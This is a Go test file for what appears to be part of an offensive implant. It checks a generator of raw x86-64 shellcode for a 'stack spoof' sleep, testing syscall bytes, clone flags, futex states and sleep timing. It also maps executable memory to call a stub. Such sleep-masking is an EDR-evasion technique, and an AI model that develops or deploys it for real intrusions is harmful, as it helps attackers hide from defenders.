//go:build linux && amd64

package commands

import (
	"encoding/binary"
	"testing"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

func TestGenerateLinuxSleepStub_Size(t *testing.T) {
	stub := generateLinuxSleepStub(0x7F0000001000)
	if len(stub) == 0 {
		t.Fatal("stub is empty")
	}
	if len(stub) > 512 {
		t.Errorf("stub unexpectedly large: %d bytes (expected <512)", len(stub))
	}
	t.Logf("stub size: %d bytes", len(stub))
}

func TestGenerateLinuxSleepStub_DataAddrEmbedded(t *testing.T) {
	addr := uintptr(0xDEADBEEF12345678)
	stub := generateLinuxSleepStub(addr)

	// Prologue: push rbp (1) + mov rbp,rsp (3) + push rbx (1) +
	//           push r12 (2) + push r13 (2) + push r14 (2) + push r15 (2) = 13
	// movabs r12 opcode: 0x49 0xBC at offset 13
	if stub[13] != 0x49 || stub[14] != 0xBC {
		t.Fatalf("expected movabs r12 (49 BC) at offset 13, got %02X %02X", stub[13], stub[14])
	}

	embedded := binary.LittleEndian.Uint64(stub[15:23])
	if embedded != uint64(addr) {
		t.Errorf("embedded addr = 0x%X, want 0x%X", embedded, addr)
	}
}

func TestGenerateLinuxSleepStub_Deterministic(t *testing.T) {
	addr := uintptr(0x1000)
	stub1 := generateLinuxSleepStub(addr)
	stub2 := generateLinuxSleepStub(addr)

	if len(stub1) != len(stub2) {
		t.Fatalf("non-deterministic length: %d vs %d", len(stub1), len(stub2))
	}
	for i := range stub1 {
		if stub1[i] != stub2[i] {
			t.Fatalf("non-deterministic at byte %d: 0x%02X vs 0x%02X", i, stub1[i], stub2[i])
		}
	}
}

func TestGenerateLinuxSleepStub_ContainsSyscallInstructions(t *testing.T) {
	stub := generateLinuxSleepStub(0x1000)

	syscallCount := 0
	for i := 0; i < len(stub)-1; i++ {
		if stub[i] == 0x0F && stub[i+1] == 0x05 {
			syscallCount++
		}
	}

	// Expected: clone, prctl, rt_sigaction(SIGSEGV), rt_sigaction(SIGBUS),
	// rt_sigprocmask, futex_wait, nanosleep, futex_wake = 8
	if syscallCount != 8 {
		t.Errorf("found %d syscall instructions, expected 8", syscallCount)
	}
}

func TestGenerateLinuxSleepStub_ContainsRet(t *testing.T) {
	stub := generateLinuxSleepStub(0x1000)

	hasRet := false
	for _, b := range stub {
		if b == 0xC3 {
			hasRet = true
			break
		}
	}
	if !hasRet {
		t.Error("stub does not contain ret (0xC3) instruction")
	}
}

func TestGenerateLinuxSleepStub_CloneFlags(t *testing.T) {
	stub := generateLinuxSleepStub(0x1000)

	// CLONE_VM|CLONE_FS|CLONE_FILES = 0x700
	found := false
	for i := 0; i < len(stub)-4; i++ {
		if stub[i] == 0xBF {
			val := binary.LittleEndian.Uint32(stub[i+1 : i+5])
			if val == 0x700 {
				found = true
				break
			}
		}
	}
	if !found {
		t.Error("clone flags 0x700 not found in stub")
	}
}

func TestGenerateLinuxSleepStub_SyscallNumbers(t *testing.T) {
	stub := generateLinuxSleepStub(0x1000)

	expectedSyscalls := map[uint32]string{
		56:  "SYS_clone",
		157: "SYS_prctl",
		13:  "SYS_rt_sigaction",
		14:  "SYS_rt_sigprocmask",
		202: "SYS_futex",
		35:  "SYS_nanosleep",
	}

	for num, name := range expectedSyscalls {
		found := false
		for i := 0; i < len(stub)-4; i++ {
			if stub[i] == 0xB8 {
				val := binary.LittleEndian.Uint32(stub[i+1 : i+5])
				if val == num {
					found = true
					break
				}
			}
		}
		if !found {
			t.Errorf("syscall number %d (%s) not found in stub", num, name)
		}
	}
}

func TestDataBlockLayout_Alignment(t *testing.T) {
	if lnxDataOffState != 0 {
		t.Error("state must be at offset 0 for futex")
	}
	if lnxDataOffTvSec%8 != 0 {
		t.Error("tv_sec must be 8-byte aligned")
	}
	if lnxDataOffTvNsec%8 != 0 {
		t.Error("tv_nsec must be 8-byte aligned")
	}
	if lnxDataOffStackTop%8 != 0 {
		t.Error("stack_top must be 8-byte aligned")
	}
	if lnxDataBlockSize != 48 {
		t.Errorf("data block size = %d, expected 48", lnxDataBlockSize)
	}
}

func TestSpoofStateConstants(t *testing.T) {
	if spoofStateIdle != 0 {
		t.Error("IDLE must be 0 (futex_wait expects 0)")
	}
	if spoofStateSleep != 1 {
		t.Error("SLEEP must be 1")
	}
	if spoofStateDone != 2 {
		t.Error("DONE must be 2")
	}
}

func TestFutexWakeWait_NoDeadlock(t *testing.T) {
	data := make([]byte, 8)
	addr := uintptr(unsafe.Pointer(&data[0]))
	futexWake(addr, 1)
}

func TestMinimalStubCall(t *testing.T) {
	// Generate a minimal stub that just returns (ret = 0xC3)
	pageSize := unix.Getpagesize()
	mem, err := unix.Mmap(-1, 0, pageSize,
		unix.PROT_READ|unix.PROT_WRITE,
		unix.MAP_PRIVATE|unix.MAP_ANON)
	if err != nil {
		t.Fatal(err)
	}
	mem[0] = 0xC3 // ret
	if err := unix.Mprotect(mem, unix.PROT_READ|unix.PROT_EXEC); err != nil {
		t.Fatal(err)
	}
	addr := uintptr(unsafe.Pointer(&mem[0]))
	invokeStub(addr)
	unix.Munmap(mem)
	t.Log("minimal ret-only stub call succeeded")
}

func TestStackSpoofInit_Lifecycle(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode — creates native threads")
	}

	err := InitStackSpoof()
	if err != nil {
		t.Fatalf("InitStackSpoof: %v", err)
	}
	defer CleanupStackSpoof()

	if !StackSpoofAvailable() {
		t.Fatal("stack spoof not available after init")
	}

	start := time.Now()
	StackSpoofSleep(100 * time.Millisecond)
	elapsed := time.Since(start)

	if elapsed < 80*time.Millisecond {
		t.Errorf("sleep too short: %v", elapsed)
	}
	if elapsed > 500*time.Millisecond {
		t.Errorf("sleep too long: %v", elapsed)
	}
}

func TestStackSpoofSleep_MultipleCycles(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping in short mode — creates native threads")
	}

	err := InitStackSpoof()
	if err != nil {
		t.Fatalf("InitStackSpoof: %v", err)
	}
	defer CleanupStackSpoof()

	for i := 0; i < 5; i++ {
		start := time.Now()
		StackSpoofSleep(50 * time.Millisecond)
		elapsed := time.Since(start)

		if elapsed < 30*time.Millisecond || elapsed > 300*time.Millisecond {
			t.Errorf("cycle %d: sleep duration %v out of expected range", i, elapsed)
		}
	}
}

func TestStackSpoofSleep_FallbackWhenNotInit(t *testing.T) {
	start := time.Now()
	StackSpoofSleep(50 * time.Millisecond)
	elapsed := time.Since(start)

	if elapsed < 30*time.Millisecond {
		t.Errorf("fallback sleep too short: %v", elapsed)
	}
}
